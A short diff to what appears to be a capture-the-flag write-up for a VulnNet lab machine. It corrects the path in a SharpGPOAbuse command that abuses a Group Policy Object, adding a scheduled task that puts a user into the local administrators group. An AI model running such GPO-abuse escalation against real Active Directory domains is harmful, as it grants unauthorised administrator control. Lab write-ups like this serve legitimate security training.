@@ -163,7 +163,7 @@ Here is the shortest path to the admin where we will be abusing one of the \`GPO
 We use \`SharpGPOAbuse.exe\` to escalate our privilege.
 
 \`\`\`
-.\SharpGPOAbuse.Exe AddComputerTask TaskName "babbadeckl_privesc" Author vulnnet\\administrator Command "cmd.exe" Arguments "/c net localgroup administrators enterprise-security /add" GPOName "SECURITY-POL-VN"
+./SharpGPOAbuse.exe AddComputerTask TaskName "babbadeckl_privesc" Author vulnnet\\administrator Command "cmd.exe" Arguments "/c net localgroup administrators enterprise-security /add" GPOName "SECURITY-POL-VN"
 \`\`\`
 
 \`\`\`
